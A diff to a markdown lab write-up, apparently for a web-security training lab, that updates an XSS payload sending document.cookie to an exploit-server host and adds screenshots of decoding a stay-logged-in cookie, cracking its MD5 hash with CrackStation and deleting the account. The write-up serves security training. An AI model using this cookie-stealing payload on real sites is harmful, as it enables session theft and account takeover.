@@ -4951,11 +4951,14 @@ Replace:
 YOUR-EXPLOIT-SERVER-ID
 ```
 
+```text
+https://exploit-0a550062044b676c81b9ba4d01650093.exploit-server.net/exploit
+```
 with your own exploit server ID.
 
 ```html
 <script>
-document.location=' https://exploit-0aac00f403750af080b98e90016100c9.exploit-server.net/exploit'+document.cookie
+document.location='https://exploit-0a550062044b676c81b9ba4d01650093.exploit-server.net/exploit'+document.cookie
 </script>
 ```
 
@@ -5002,6 +5005,7 @@ GET /stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
 ```
 
 ---
+![lab](images/hashc.png)
 
 # Decode the Stolen Cookie
 
@@ -5021,6 +5025,7 @@ Result:
 ```text
 carlos:26323c16d5f4dabff3bb136f2460a943
 ```
+![lab](images/hashco.png)
 
 ---
 
@@ -5051,7 +5056,9 @@ Hash:
 ```text
 26323c16d5f4dabff3bb136f2460a943
 ```
-
+ use crack station : 
+ ![lab](images/crack.png)
+ 
 Result:
 
 ```text
@@ -5102,7 +5109,8 @@ Delete account
 2. Confirm deletion.
 
 The lab is now solved.
-
+ ![lab](images/solv.png)
+ 
 ---
 
 # Vulnerability Explanation
@@ -5140,3 +5148,4 @@ Delete Account
 ```
 
 ---
+-----
